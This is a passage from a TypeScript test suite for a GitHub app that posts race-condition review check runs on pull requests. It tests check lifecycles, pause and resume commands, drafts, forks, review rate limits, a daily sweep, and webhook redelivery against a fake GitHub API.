    expect(await result(await deliver(env, "pull_request", closed, { fetch: gh.fetch }))).toBe("issue opened");
    expect(sql.rows("SELECT closed FROM github_prs")[0]!.closed).not.toBeNull();
    expect(gh.issues).toHaveLength(1);
    expect(gh.issues[0]!.title).toBe("Duplicate submit on POST /api/orders (GenClass, from #12)");
    expect(gh.issues[0]!.body).toContain("Pull request #12 was merged with 1 finding");
    expect(await result(await deliver(env, "pull_request", closed, { fetch: gh.fetch }))).toBe("closed");
    expect(gh.issues).toHaveLength(1);
    // the default never opens one, and a pull request closed without merging does not either
    const plain = await reviewed();
    plain.gh.pulls.set(`${REPO.full_name}#12`, closed.pull_request);
    expect(await result(await deliver(plain.env, "pull_request", closed, { fetch: plain.gh.fetch }))).toBe("closed");
    expect(plain.gh.issues).toEqual([]);
    const unmerged = await reviewed({}, "issues: merge\n");
    await pullRequest(unmerged.env, unmerged.gh, "closed", 12, SHA1, { state: "closed", merged: false });
    expect(unmerged.gh.issues).toEqual([]);
  });

  it("a reopened pull request is open again for its test runs, and a check is only ever updated on its own commit", async () => {
    const { env, gh, sql } = await reviewed();
    await pullRequest(env, gh, "closed", 12, SHA1, { state: "closed" });
    expect(sql.rows("SELECT closed FROM github_prs")[0]!.closed).not.toBeNull();
    const before = gh.calls.length;
    expect(await result(await deliver(env, "workflow_run", runEvent(gh.runs.get(REPO.full_name)![0]!.id, SHA1), { fetch: gh.fetch }))).toBe("no pull request at this commit");
    expect(gh.calls.length).toBe(before);
    expect(await result(await pullRequest(env, gh, "reopened", 12, SHA1))).toBe("findings");
    expect(sql.rows("SELECT closed FROM github_prs")[0]!.closed).toBeNull();
    expect(await result(await deliver(env, "workflow_run", runEvent(gh.runs.get(REPO.full_name)![0]!.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    // the check is turned off, a commit goes by without one, and it is turned on again: the new commit gets its own
    gh.settings.set(REPO.full_name, "check: false\n");
    advance(121_000);
    await pullRequest(env, gh, "synchronize", 12, SHA2);
    expect(gh.checksAt(SHA2)).toEqual([]);
    expect(sql.rows("SELECT check_run_id FROM github_prs")[0]!.check_run_id).toBeNull();
    gh.settings.delete(REPO.full_name);
    advance(121_000);
    const patches = () => gh.calls.filter((c) => c.method === "PATCH" && c.path.includes("/check-runs/")).length;
    const was = patches();
    await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev review"), { fetch: gh.fetch });
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(patches()).toBe(was);
  });

  it("re-running the check from GitHub's page reviews again, and only the app's own check counts", async () => {
    const { env, gh } = await reviewed();
    const rerun = (appId: number, sha = SHA1) => ({ action: "rerequested", check_run: { id: 1, head_sha: sha, app: { id: appId } }, repository: REPO, installation: { id: INSTALLATION } });
    const before = gh.calls.length;
    expect(await result(await deliver(env, "check_run", rerun(1), { fetch: gh.fetch }))).toBe("ignored");
    expect(await result(await deliver(env, "check_run", { ...rerun(Number(APP_ID)), action: "created" }, { fetch: gh.fetch }))).toBe("ignored");
    expect(gh.calls.length).toBe(before);
    expect(await result(await deliver(env, "check_run", rerun(Number(APP_ID)), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.calls.length).toBeGreaterThan(before);
    expect(await result(await deliver(env, "check_run", rerun(Number(APP_ID), SHA3), { fetch: gh.fetch }))).toBe("no pull request at this commit");
    // asked for by a person, it runs even where automatic reviews are off
    const off = githubSetup();
    const g = fakeGithub();
    g.settings.set(REPO.full_name, "reviews: false\n");
    expect(await result(await pullRequest(off.env, g, "opened", 12, SHA1))).toBe("automatic reviews are off");
    expect(g.checksAt(SHA1)).toEqual([]);
    off.sql.db.prepare("UPDATE github_prs SET head_sha = ?").run(SHA1);
    expect(await result(await deliver(off.env, "check_run", rerun(Number(APP_ID)), { fetch: g.fetch }))).toBe("no race files");
    expect(g.checksAt(SHA1)).toHaveLength(1);
  });
});

describe("github app: the first run, and when the app stays silent (docs/github-app/README.md, \"Setup\")", () => {
  const writes = (gh: ReturnType<typeof fakeGithub>) => gh.calls.filter((c) => c.method !== "GET" && !c.path.includes("/access_tokens")).map((c) => `${c.method} ${c.path}`);
  const ALL = { repository_selection: "all" };

  it("all repositories: a repository gets nothing, not even a check, until race files were read for it once; then every pull request gets the check", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    // nothing is written when the app is installed
    await deliver(env, "installation", installationCreated(ALL), { fetch: gh.fetch });
    expect(gh.calls).toEqual([]);
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("no race files");
    // a run without race files finishes, and another push comes: still nothing
    const lint = gh.addRun(SHA1, {}, { name: "lint", workflow_id: 2 });
    expect(await result(await deliver(env, "workflow_run", runEvent(lint.id, SHA1), { fetch: gh.fetch }))).toBe("no race files in this run");
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("no race files");
    expect(writes(gh)).toEqual([]);
    expect(gh.checks.size).toBe(0);
    // none of it was counted against the installation's hour
    expect(sql.rows("SELECT * FROM github_usage")).toEqual([]);
    expect(sql.rows("SELECT * FROM github_repo_facts")).toEqual([]);

    // the commit's test run uploads race files: the review, with its check and its comment
    const run = gh.addRun(SHA2);
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA2), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.summary(12)).toContain("**2 findings**");
    expect(sql.rows("SELECT evidence IS NOT NULL AS evidence, intro FROM github_repo_facts")).toEqual([{ evidence: 1, intro: null }]);
    // from now on every pull request of the repository gets the check, with or without race files
    expect(await result(await pullRequest(env, gh, "opened", 13, SHA3))).toBe("no race files");
    expect(gh.checksAt(SHA3)).toHaveLength(1);
    expect(gh.checksAt(SHA3)[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(gh.checksAt(SHA3)[0].output.title).toBe("No race files for this commit");
  });

  it("all repositories: a person who types a review command always gets an answer", async () => {
    const { env } = githubSetup();
    const gh = fakeGithub();
    await deliver(env, "installation", installationCreated(ALL), { fetch: gh.fetch });
    await pullRequest(env, gh, "opened", 12, SHA1);
    expect(gh.checks.size).toBe(0);
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "/genclass review", { id: 9100 }), { fetch: gh.fetch }))).toBe("no race files");
    expect(gh.reactions).toEqual([{ comment: 9100, content: "eyes" }]);
    const [check] = gh.checksAt(SHA1);
    expect(check).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(check.output.title).toBe("No race files for this commit");
    expect(check.output.summary).toContain("upload `test-results/genclass` from the workflow");
    // Re-run on that check is a person asking too
    const rerun = { action: "rerequested", check_run: { id: 1, head_sha: SHA1, app: { id: Number(APP_ID) } }, repository: REPO, installation: { id: INSTALLATION } };
    expect(await result(await deliver(env, "check_run", rerun, { fetch: gh.fetch }))).toBe("no race files");
    // and it does not make the repository one that hears about every pull request
    await pullRequest(env, gh, "opened", 13, SHA2);
    expect(gh.checksAt(SHA2)).toEqual([]);
  });

  it("selected repositories: one check, once per repository for ever, and after it nothing until race files are read", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("no race files");
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(gh.checksAt(SHA1)[0]).toMatchObject({ status: "completed", conclusion: "skipped" });
    // the same pull request again, its next push, another pull request: no second check of any kind
    expect(await result(await pullRequest(env, gh, "reopened", 12, SHA1))).toBe("no race files");
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("no race files");
    expect(await result(await pullRequest(env, gh, "opened", 13, SHA3))).toBe("no race files");
    expect(writes(gh)).toEqual(["POST /repos/acme/shop/check-runs"]);
    expect(gh.posted(12)).toEqual([]);
    expect(sql.rows("SELECT evidence, intro IS NOT NULL AS intro FROM github_repo_facts")).toEqual([{ evidence: null, intro: 1 }]);
    // two pull requests opened at the same moment cannot both get it: the claim is one statement
    const both = githubSetup();
    const g2 = fakeGithub();
    await deliver(both.env, "installation", installationCreated(), { fetch: g2.fetch });
    await Promise.all([pullRequest(both.env, g2, "opened", 21, SHA1), pullRequest(both.env, g2, "opened", 22, SHA2)]);
    expect(g2.checks.size).toBe(1);
    // where the check may fail a pull request, the one check is left out: "skipped" would pass a required check
    const strict = githubSetup();
    const g3 = fakeGithub();
    g3.settings.set(REPO.full_name, "check:\n  fail_on: any\n");
    await deliver(strict.env, "installation", installationCreated(), { fetch: g3.fetch });
    expect(await result(await pullRequest(strict.env, g3, "opened", 12, SHA1))).toBe("no race files");
    expect(g3.checks.size).toBe(0);
  });

  it("an installation first seen through an event counts as all repositories until GitHub was asked, once, and the answer stored", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    gh.selections.set(INSTALLATION, "all");
    const asked = () => gh.calls.filter((c) => c.path === `/app/installations/${INSTALLATION}`).length;
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("no race files");
    expect(asked()).toBe(1);
    expect(sql.rows("SELECT selection FROM github_installations")).toEqual([{ selection: "all" }]);
    expect(gh.checks.size).toBe(0);
    await pullRequest(env, gh, "opened", 13, SHA2);
    expect(asked()).toBe(1);
    expect(gh.checks.size).toBe(0);

    // GitHub says "selected": the one check
    const sel = githubSetup();
    const g2 = fakeGithub();
    expect(sel.sql.rows("SELECT * FROM github_installations")).toEqual([]);
    await pullRequest(sel.env, g2, "opened", 12, SHA1);
    expect(sel.sql.rows("SELECT selection FROM github_installations")).toEqual([{ selection: "selected" }]);
    expect(g2.checksAt(SHA1)[0]).toMatchObject({ conclusion: "skipped" });

    // GitHub cannot be asked: nothing is written, and the question is asked again at the next pull request
    const down = githubSetup();
    let failing = true;
    const g3 = fakeGithub({ answer: (c) => (failing && c.path === `/app/installations/${INSTALLATION}` ? new Response("{}", { status: 500 }) : undefined) });
    expect(await result(await pullRequest(down.env, g3, "opened", 12, SHA1))).toBe("no race files");
    expect(g3.checks.size).toBe(0);
    expect(down.sql.rows("SELECT selection FROM github_installations")).toEqual([{ selection: "unknown" }]);
    failing = false;
    await pullRequest(down.env, g3, "opened", 13, SHA2);
    expect(g3.checksAt(SHA2)).toHaveLength(1);
    expect(down.sql.rows("SELECT selection FROM github_installations")).toEqual([{ selection: "selected" }]);
  });

  it("race files from a fork review that pull request, and do not switch the check on for the repository's other pull requests", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    await deliver(env, "installation", installationCreated(ALL), { fetch: gh.fetch });
    const fork = { author_association: "NONE", user: { id: 666, login: "mallory", type: "User" }, head: { sha: SHA1, ref: "patch-1", repo: { id: 99001, full_name: "mallory/shop" } } };
    await pullRequest(env, gh, "opened", 14, SHA1, fork);
    const run = gh.addRun(SHA1);
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    expect(gh.summary(14)).toContain("**2 findings**");
    expect(sql.rows("SELECT * FROM github_repo_facts")).toEqual([]);
    // the fork's own next commit is still reviewed as before (it had race files itself)
    expect(await result(await pullRequest(env, gh, "synchronize", 14, SHA2, { ...fork, head: { ...fork.head, sha: SHA2 } }))).toBe("no race files");
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    // another pull request of the repository hears nothing
    await pullRequest(env, gh, "opened", 15, SHA3);
    expect(gh.checksAt(SHA3)).toEqual([]);
  });

  it("a repository linked to a GenClass app is not silent: its production findings are what there is to read", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    const me = await signedIn(env);
    const app = await createApp(env, me.cookie, "Shop");
    await deliver(env, "installation", installationCreated(ALL), { fetch: gh.fetch });
    sql.db.prepare("INSERT INTO github_repos (repo_id, installation_id, full_name, private, project_id, linked_by, linked, updated) VALUES (?, ?, ?, 0, ?, ?, ?, ?)").run(REPO.id, INSTALLATION, REPO.full_name, app.id, me.account.id, now().toISOString(), now().toISOString());
    expect(await result(await pullRequest(env, gh, "opened", 12, SHA1))).toBe("no race files");
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(gh.checksAt(SHA1)[0].output.title).toBe("No race files for this commit");
  });
});

describe("github app: a check that waits is always finished (src/github/handlers.ts header)", () => {
  const FAIL_ON = "check:\n  fail_on: reproducible\n";
  const stateOf = (sql: ReturnType<typeof githubSetup>["sql"]) => parseState(String(sql.rows("SELECT state FROM github_prs WHERE number = 12")[0]!.state));
  /** A reviewed pull request (race files read at SHA1), then a push of SHA2 whose test run is still going. */
  async function waitingAt2(settings?: string) {
    const s = await reviewed({}, settings);
    s.gh.runs.get(REPO.full_name)!.push({ id: 6001, head_sha: SHA2, status: "in_progress", conclusion: null });
    expect(await result(await pullRequest(s.env, s.gh, "synchronize", 12, SHA2))).toBe("waiting for the test run");
    return s;
  }
  const finish = (gh: ReturnType<typeof fakeGithub>, artifacts: Record<string, Uint8Array> = {}) => {
    const run = gh.runs.get(REPO.full_name)!.find((r) => r.id === 6001)!;
    run.status = "completed";
    run.conclusion = "success";
    run.artifacts = artifacts;
    return run;
  };

  it("default settings: \"Waiting for this commit's test run\" is rewritten when the commit's runs finish without race files", async () => {
    const { env, gh, sql } = await waitingAt2();
    // without fail_on the check is completed, and says it waits
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(gh.checksAt(SHA2)[0].output.title).toBe("Waiting for this commit's test run");
    expect(gh.summary(12)).toContain("Waiting for the test run of `2222222`");
    expect(stateOf(sql)).toMatchObject({ waiting: SHA2, held: false });
    // another workflow finishes first: one that is still going can still upload, so nothing changes
    gh.runs.get(REPO.full_name)!.push({ id: 6002, head_sha: SHA2, name: "lint", workflow_id: 2 });
    expect(await result(await deliver(env, "workflow_run", runEvent(6002, SHA2), { fetch: gh.fetch }))).toBe("waiting for the test run");
    expect(gh.checksAt(SHA2)[0].output.title).toBe("Waiting for this commit's test run");
    // the last run finishes and uploaded nothing: the same check and the comment stop saying they wait
    finish(gh);
    expect(await result(await deliver(env, "workflow_run", runEvent(6001, SHA2), { fetch: gh.fetch }))).toBe("no race files");
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.checksAt(SHA2)[0].output.title).toBe("No race files for this commit");
    expect(gh.checksAt(SHA2)[0].output.summary).toContain("upload `test-results/genclass` from the workflow");
    expect(gh.summary(12)).toContain("No race files for `2222222`.");
    expect(gh.summary(12)).not.toContain("Waiting for the test run");
    expect(stateOf(sql).waiting).toBeNull();
    expect(sql.rows("SELECT due FROM github_prs")[0]!.due).toBeNull();
  });

  it("paused on the pull request while its check is in progress: the check is finished at once and says why; resume reads what was missed", async () => {
    const { env, gh, sql } = await waitingAt2(FAIL_ON);
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "in_progress" });
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev pause"), { fetch: gh.fetch }))).toBe("paused");
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(gh.checksAt(SHA2)[0].output.title).toBe("Paused on this pull request");
    expect(gh.checksAt(SHA2)[0].output.summary).toContain("`@genclass-dev resume`");
    expect(stateOf(sql)).toMatchObject({ waiting: null, held: false });
    expect(sql.rows("SELECT paused FROM github_prs WHERE number = 12")[0]!.paused).toBe(1);
    // the test run finishes with a reproducible finding while paused: not read
    finish(gh, { "genclass-races": racesZip() });
    expect(await result(await deliver(env, "workflow_run", runEvent(6001, SHA2), { fetch: gh.fetch }))).toBe("paused on this pull request");
    expect(gh.checksAt(SHA2)[0].output.title).toBe("Paused on this pull request");
    // resume starts the review the pause skipped: the same check now fails
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev resume"), { fetch: gh.fetch }))).toBe("resumed");
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "failure" });
  });

  it("a draft, a setting or a paused repository that stops reviews while a check is in progress finishes it, neutral, with the reason", async () => {
    // converted to a draft: GitHub's event for it finishes the check at once
    const draft = await waitingAt2(FAIL_ON);
    expect(await result(await pullRequest(draft.env, draft.gh, "converted_to_draft", 12, SHA2, { draft: true }))).toBe("draft");
    expect(draft.gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(draft.gh.checksAt(SHA2)[0].output.title).toBe("Draft pull requests are not reviewed");
    expect(stateOf(draft.sql).waiting).toBeNull();
    // its test run finishes with a reproducible finding: a draft is not read
    finish(draft.gh, { "genclass-races": racesZip() });
    expect(await result(await deliver(draft.env, "workflow_run", runEvent(6001, SHA2), { fetch: draft.gh.fetch }))).toBe("draft");
    expect(draft.gh.checksAt(SHA2)[0].output.title).toBe("Draft pull requests are not reviewed");
    // a draft with nothing waiting is not looked at for that event at all
    const idle = draft.gh.calls.length;
    expect(await result(await pullRequest(draft.env, draft.gh, "converted_to_draft", 12, SHA2, { draft: true }))).toBe("ignored");
    expect(draft.gh.calls.length).toBe(idle);
    // the same event again writes nothing more
    const mark = draft.gh.calls.length;
    await deliver(draft.env, "workflow_run", runEvent(6001, SHA2), { fetch: draft.gh.fetch });
    expect(draft.gh.calls.slice(mark).filter((c) => c.method !== "GET")).toEqual([]);
    // marked ready again: reviewed, and the same check gives the result
    draft.gh.pulls.set(`${REPO.full_name}#12`, pullEvent("ready_for_review", 12, SHA2).pull_request);
    expect(await result(await deliver(draft.env, "pull_request", pullEvent("ready_for_review", 12, SHA2), { fetch: draft.gh.fetch }))).toBe("findings");
    expect(draft.gh.checksAt(SHA2)).toHaveLength(1);
    expect(draft.gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "failure" });

    // automatic reviews turned off in the settings
    const off = await waitingAt2(FAIL_ON);
    off.gh.settings.set(REPO.full_name, `reviews: false\n${FAIL_ON}`);
    advance(121_000);
    finish(off.gh);
    expect(await result(await deliver(off.env, "workflow_run", runEvent(6001, SHA2), { fetch: off.gh.fetch }))).toBe("automatic reviews are off");
    expect(off.gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(off.gh.checksAt(SHA2)[0].output.title).toBe("Automatic reviews are off");

    // the repository paused from the account page: nothing is read, and the one check in progress is finished
    const paused = await waitingAt2(FAIL_ON);
    paused.sql.db.prepare("INSERT INTO github_repos (repo_id, installation_id, full_name, private, paused, updated) VALUES (?, ?, ?, 0, 1, ?)").run(REPO.id, INSTALLATION, REPO.full_name, now().toISOString());
    finish(paused.gh, { "genclass-races": racesZip() });
    const before = paused.gh.calls.length;
    expect(await result(await deliver(paused.env, "workflow_run", runEvent(6001, SHA2), { fetch: paused.gh.fetch }))).toBe("paused");
    expect(paused.gh.calls.slice(before).map((c) => `${c.method} ${c.path}`)).toEqual([expect.stringMatching(/^PATCH \/repos\/acme\/shop\/check-runs\/\d+$/)]);
    expect(paused.gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(paused.gh.checksAt(SHA2)[0].output.title).toBe("Reviews are paused");
    // after that a paused repository is left alone entirely
    const quiet = paused.gh.calls.length;
    expect(await result(await pullRequest(paused.env, paused.gh, "synchronize", 12, SHA3))).toBe("paused");
    expect(paused.gh.calls.length).toBe(quiet);
  });

  it("the hourly limit is reached while a check is in progress: it stays in progress and says why, a command gets a reply, and the daily sweep runs the review", async () => {
    const { env, gh, sql } = await waitingAt2(FAIL_ON);
    sql.db.prepare("UPDATE github_usage SET reviews = ?").run(REVIEWS_PER_HOUR);
    // the test run finishes with a reproducible finding, and the hour is used up
    finish(gh, { "genclass-races": racesZip() });
    expect(await result(await deliver(env, "workflow_run", runEvent(6001, SHA2), { fetch: gh.fetch }))).toBe("over the hourly budget");
    // not passed, not silent: in progress, with the reason and what resumes it
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "in_progress" });
    expect(gh.checksAt(SHA2)[0].conclusion).toBeUndefined();
    expect(gh.checksAt(SHA2)[0].output.title).toBe("Hourly review limit reached");
    expect(gh.checksAt(SHA2)[0].output.summary).toContain("limit of 120 reviews an hour");
    expect(gh.checksAt(SHA2)[0].output.summary).toContain("after 13:00 UTC");
    expect(stateOf(sql)).toMatchObject({ waiting: SHA2, held: true });
    expect(sql.rows("SELECT due FROM github_prs")[0]!.due).not.toBeNull();
    // the same event again: the check already says it, nothing is written twice
    const mark = gh.calls.length;
    await deliver(env, "workflow_run", runEvent(6001, SHA2), { fetch: gh.fetch });
    expect(gh.calls.slice(mark).filter((c) => c.method !== "GET")).toEqual([]);
    // a person who asks in the same hour gets a reply that says so
    const said = gh.posted(12).length;
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev review", { id: 9200 }), { fetch: gh.fetch }))).toBe("over the hourly budget");
    expect(gh.reactions).toContainEqual({ comment: 9200, content: "eyes" });
    expect(gh.posted(12)).toHaveLength(said + 1);
    expect(gh.posted(12).at(-1)).toContain("This installation reached the app's limit of 120 reviews an hour");
    expect(gh.posted(12).at(-1)).toContain("Ask again after 13:00 UTC.");
    // nothing else happens for this commit. The next day's sweep runs the review that was owed: the same check fails
    advance(15 * 3_600_000);
    expect(await githubSweep(env, { now, fetch: gh.fetch })).toBe(1);
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "failure" });
    expect(gh.checksAt(SHA2)[0].output.title).toBe("2 findings, 1 reproducible");
    expect(stateOf(sql)).toMatchObject({ waiting: null, held: false });
    expect(sql.rows("SELECT due FROM github_prs")[0]!.due).toBeNull();
    // nothing is due any more: the next sweep looks at nothing
    expect(await githubSweep(env, { now, fetch: gh.fetch })).toBe(0);
  });

  it("a newer commit, a closed pull request and a pull request at its limit of reviews finish a check in progress as cancelled", async () => {
    // a push while the old commit's check is in progress
    const pushed = await waitingAt2(FAIL_ON);
    const old = pushed.gh.checksAt(SHA2)[0];
    expect(old).toMatchObject({ status: "in_progress" });
    expect(await result(await pullRequest(pushed.env, pushed.gh, "synchronize", 12, SHA3))).toBe("waiting for the test run");
    expect(pushed.gh.checksAt(SHA2)).toHaveLength(1);
    expect(pushed.gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "cancelled" });
    expect(pushed.gh.checksAt(SHA2)[0].output.title).toBe("A newer commit was pushed");
    expect(pushed.gh.checksAt(SHA2)[0].output.summary).toContain("`3333333`");
    expect(pushed.gh.checksAt(SHA3)[0]).toMatchObject({ status: "in_progress" });
    expect(stateOf(pushed.sql)).toMatchObject({ waiting: SHA3, held: true });

    // closed while the check is in progress
    const closed = await waitingAt2(FAIL_ON);
    expect(await result(await pullRequest(closed.env, closed.gh, "closed", 12, SHA2, { state: "closed" }))).toBe("closed");
    expect(closed.gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "cancelled" });
    expect(closed.gh.checksAt(SHA2)[0].output.title).toBe("Pull request closed");
    expect(closed.sql.rows("SELECT closed IS NOT NULL AS closed, due FROM github_prs")).toEqual([{ closed: 1, due: null }]);

    // the pull request reaches its limit of reviews: it is not updated any more, and its check does not stay in progress
    const capped = await waitingAt2(FAIL_ON);
    capped.sql.db.prepare("UPDATE github_prs SET reviews = ?").run(REVIEWS_PER_PR);
    finish(capped.gh, { "genclass-races": racesZip() });
    expect(await result(await deliver(capped.env, "workflow_run", runEvent(6001, SHA2), { fetch: capped.gh.fetch }))).toBe("over the pull request's budget");
    expect(capped.gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "cancelled" });
    expect(capped.gh.checksAt(SHA2)[0].output.title).toBe("Review limit reached");
    expect(capped.gh.checksAt(SHA2)[0].output.summary).toContain("limit of 400 reviews");
    expect(capped.sql.rows("SELECT due FROM github_prs")[0]!.due).toBeNull();
  });

  it("a check in progress whose id was never stored (the job died right after creating it) is replaced by a finished one, not left as it is", async () => {
    // the row says a check waits in progress on SHA2, and has no id for it
    const lost = await waitingAt2(FAIL_ON);
    lost.sql.db.prepare("UPDATE github_prs SET check_run_id = NULL").run();
    expect(await result(await deliver(lost.env, "issue_comment", commentEvent(12, "@genclass-dev pause"), { fetch: lost.gh.fetch }))).toBe("paused");
    // it cannot be rewritten, so a new check run on the commit says why nothing is read: GitHub shows the latest of a name
    expect(lost.gh.checksAt(SHA2)).toHaveLength(2);
    expect(lost.gh.checksAt(SHA2).at(-1)).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(lost.gh.checksAt(SHA2).at(-1).output.title).toBe("Paused on this pull request");
    expect(stateOf(lost.sql)).toMatchObject({ waiting: null, held: false });
    expect(lost.sql.rows("SELECT check_run_id FROM github_prs")[0]!.check_run_id).toBeGreaterThan(0);
    // the same on the old commit when a newer one is pushed
    const pushed = await waitingAt2(FAIL_ON);
    pushed.sql.db.prepare("UPDATE github_prs SET check_run_id = NULL").run();
    await pullRequest(pushed.env, pushed.gh, "synchronize", 12, SHA3);
    expect(pushed.gh.checksAt(SHA2).at(-1)).toMatchObject({ status: "completed", conclusion: "cancelled" });
  });

  it("the daily sweep ends a wait that no event ended: a commit that starts no workflow, and a job that died", async () => {
    // fail_on, and a commit that starts no workflow at all: in progress, with nothing to finish it but the sweep
    const { env, gh, sql } = await reviewed({}, "check:\n  fail_on: any\n");
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("waiting for the test run");
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "in_progress" });
    // not yet due for an hour: left alone
    advance(30 * 60_000);
    expect(await githubSweep(env, { now, fetch: gh.fetch })).toBe(0);
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "in_progress" });
    advance(31 * 60_000);
    expect(await githubSweep(env, { now, fetch: gh.fetch })).toBe(1);
    expect(gh.checksAt(SHA2)).toHaveLength(1);
    expect(gh.checksAt(SHA2)[0]).toMatchObject({ status: "completed", conclusion: "neutral" });
    expect(gh.checksAt(SHA2)[0].output.title).toBe("No race files for this commit");
    expect(sql.rows("SELECT due, lease FROM github_prs")).toEqual([{ due: null, lease: null }]);

    // A job the platform stopped ran no more code: its lease is still held and its row still says a review is owed.
    // The race files its commit uploaded are read by the sweep.
    const dead = await reviewed();
    await pullRequest(dead.env, dead.gh, "synchronize", 12, SHA2);
    dead.gh.addRun(SHA2);
    await takeLease(dead.env.DB!, { repoId: REPO.id, number: 12, installationId: INSTALLATION }, now());
    expect(dead.sql.rows("SELECT due IS NOT NULL AS due, lease IS NOT NULL AS lease FROM github_prs")).toEqual([{ due: 1, lease: 1 }]);
    advance(3_700_000);
    expect(await githubSweep(dead.env, { now, fetch: dead.gh.fetch })).toBe(1);
    expect(dead.gh.checksAt(SHA2)[0].output.title).toBe("2 findings, 1 reproducible");
    expect(dead.sql.rows("SELECT due, lease FROM github_prs")).toEqual([{ due: null, lease: null }]);

    // a repository that left the installation: GitHub gives no token for it, and nothing is owed any more
    const gone = await reviewed({}, "check:\n  fail_on: any\n");
    await pullRequest(gone.env, gone.gh, "synchronize", 12, SHA2);
    gone.gh.repos.delete(REPO.full_name);
    advance(3_700_000);
    const writes = gone.gh.calls.filter((c) => c.method !== "GET" && !c.path.includes("access_tokens")).length;
    expect(await githubSweep(gone.env, { now, fetch: gone.gh.fetch })).toBe(1);
    expect(gone.gh.calls.filter((c) => c.method !== "GET" && !c.path.includes("access_tokens")).length).toBe(writes);
    expect(gone.sql.rows("SELECT due FROM github_prs")[0]!.due).toBeNull();
  });
});

describe("github app: a job's time, and deliveries (docs/github-app/SETUP.md, \"A delivery failed\")", () => {
  it("a job stops itself well inside the platform's 30 seconds: no request starts after its deadline, the lease is let go, and its delivery can be redelivered", async () => {
    const { env, sql } = githubSetup();
    // GitHub is slow: every answer takes 7 seconds
    let slow = true;
    const gh = fakeGithub({
      answer: () => {
        if (slow) advance(7_000);
        return undefined;
      },
    });
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    gh.pulls.set(`${REPO.full_name}#12`, pullEvent("opened", 12, SHA1).pull_request);
    const jobs: Promise<unknown>[] = [];
    const id = "bbbbbbbb-2222-4333-8444-555555555555";
    const t0 = now().getTime();
    const r = await deliver(env, "pull_request", pullEvent("opened", 12, SHA1), { fetch: gh.fetch, id, waitUntil: (p) => jobs.push(p) });
    expect(r.status).toBe(202);
    expect(await jobs[0]).toBe("failed: deadline");
    // three requests were made (the token, the pull request, the settings); the fourth was never started
    expect(gh.calls.map((c) => `${c.method} ${c.path}`)).toEqual([`POST /app/installations/${INSTALLATION}/access_tokens`, "GET /repos/acme/shop/pulls/12", "GET /repos/acme/shop/contents/.github/genclass.yml"]);
    expect(now().getTime() - t0).toBeLessThan(30_000);
    expect(JOB_MS).toBeLessThanOrEqual(20_000);
    // what a redelivery and the next event need: the delivery forgotten, the lease let go, the review marked as owed
    expect(sql.rows("SELECT id FROM github_deliveries WHERE id = ?", id)).toEqual([]);
    expect(sql.rows("SELECT lease, due IS NOT NULL AS due FROM github_prs")).toEqual([{ lease: null, due: 1 }]);
    expect(gh.checks.size).toBe(0);
    slow = false;
    expect(await result(await deliver(env, "pull_request", pullEvent("opened", 12, SHA1), { fetch: gh.fetch, id }))).toBe("no race files");
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    expect(sql.rows("SELECT lease, due FROM github_prs")).toEqual([{ lease: null, due: null }]);
  });

  it("an event for several pull requests starts no further one when its time is short: the rest are owed, and the job fails so it can be redelivered", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
